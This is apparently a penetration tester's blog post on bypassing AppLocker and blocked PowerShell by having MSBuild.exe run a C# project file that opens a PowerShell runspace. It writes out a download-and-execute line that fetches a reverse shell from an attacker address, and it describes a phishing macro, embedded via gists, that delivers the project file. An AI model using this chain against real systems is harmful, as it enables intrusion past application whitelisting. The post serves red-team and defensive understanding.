---
layout: post
title: Multi-Stage MSBuild AppLocker Bypass
published: true
---
![msbuild]({{ site.url }}/images/msbuild-csproj.png)

### With regular external vulnerability scans and (hopefully) pentration tests being undertaken, the perimeter is typically not the easy route into an organisation.

People click, and despite simulated phishing campaigns and training there can never be complete assurance against credential divulgence or execution of malicious code.  So it is critically important that organisations implement a multi-layered "defence in depth" strategy. Application whitelisting is an important component of such a strategy, and is an effective means of ensuring that only _known good_ applications can run.

AppLocker is a commonly used whitelisting technology and is built into Windows. The default AppLocker rules for Windows 10 are listed below.

![rules]({{ site.url }}/images/applocker-default-rules.png)

Since Powershell has gained recognition for being the attackers language of choice, many organisations are [increasingly] additionally blocking it. However, blocking powershell.exe is often not sufficient and there are many methods by which PowerShell can be instantiated to send a reverse shell reaching out of the organisation to an attacker.

The post will document one such method, with the "misplaced trust binary" MSBuild.exe. In this scenario, the company has enabled AppLocker with default rules and has also blocked Powershell.

![rules]({{ site.url }}/images/applocker-rules.png)

We can pass a ".csproj" (Visual Studio .NET C# Project file) to MSBuild and have it execute C#, in order to instantiate a Powershell runspace using System.Management.Automation.dll. The powashell.csproj file below by Casey Smith builds upon Jared Atkinson's And Justin Warner's work.

<script src="https://gist.github.com/egre55/7a6b6018c9c5ae88c63bdb23879df4d0.js"></script>

We will have the runspace download and execute our PowerShell reverse shell:

```pipeline.Commands.AddScript("IEX (iwr 'http://10.10.10.10/shell.ps1')");  // powershell 3.0+ download cradle```

<script src="https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3.js"></script>

Good. But now we need a means of delivering the project file and executing MSBuild. The macro below will download the csproj file to disk In order for the user to execute the macro the document needs to be dressed appropriately. (John Lambert...)

https://twitter.com/JohnLaTwC/status/964271442392113152


<script src="https://gist.github.com/egre55/563159175f8d6c1d31d7f3af77357549.js"></script>


